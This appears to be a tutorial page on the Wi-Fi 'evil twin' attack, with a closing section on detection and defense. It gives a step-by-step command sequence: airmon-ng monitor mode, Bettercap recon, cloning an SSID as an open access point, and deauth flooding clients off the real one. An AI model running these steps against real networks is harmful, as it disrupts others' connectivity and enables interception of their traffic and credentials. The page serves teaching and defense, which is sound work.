Evil Twin

Cloning a real access point's exact SSID with Bettercap, then deauthing clients off the original so they reconnect to the impostor instead.

01What it is

An evil twin is a rogue access point that copies the name — and often the appearance of a captive portal — of a legitimate network the target already trusts. Unlike a honeypot, which relies on a device auto-joining a remembered name, an evil twin actively targets one specific real network, aiming to pull its clients over by matching it exactly.

02How it works

Bettercap first identifies the target network's SSID, then broadcasts a second access point using that same name. Since devices generally can't distinguish two networks by name alone, forcing existing clients to disconnect — with a deauth flood — increases the odds they'll reconnect to whichever AP answers first, which can be the attacker's clone rather than the original.

  • Identify the target access point's SSID
  • Clone it with a second access point of the same name
  • Deauth clients off the real access point
  • Let clients reconnect to the clone instead
  • Log or serve a captive portal to connected clients
1 · monitor mode 
sudo airmon-ng start wlan0
2 · launch bettercap 
sudo bettercap -iface wlan0mon
3 · find the target ssid 
wifi.recon on
wifi.show
4 · clone the ap 
set wifi.ap.ssid HomeNetwork
set wifi.ap.encryption false
5 · start the clone 
wifi.ap
6 · push clients off the real ap 
set wifi.deauth.skip-broadcast false
wifi.deauth AA:BB:CC:DD:EE:FF
7 · tear down 
wifi.ap off
wifi.recon off
Note

An evil twin only works because SSIDs aren't cryptographically tied to a specific access point — the name is just a label. The real network's BSSID (MAC address) stays different, which is the one thing the clone can't fake without also spoofing that.

03Detection & defense

Because the clone shares a name with a legitimate network, spotting it usually means looking past the SSID: two access points broadcasting the same name with different signal strength, encryption, or BSSID is the giveaway. Combined with an active deauth flood on the original, the attack pattern is distinct from ordinary interference.

  • Use WPA2/WPA3-Enterprise where the client verifies a server certificate, not just a passphrase
  • Enable 802.11w so deauth frames used to force reconnects can't be forged
  • Watch for duplicate SSIDs with mismatched BSSIDs or encryption settings
  • Prefer a VPN on any network, so even a successful evil twin can't read the traffic
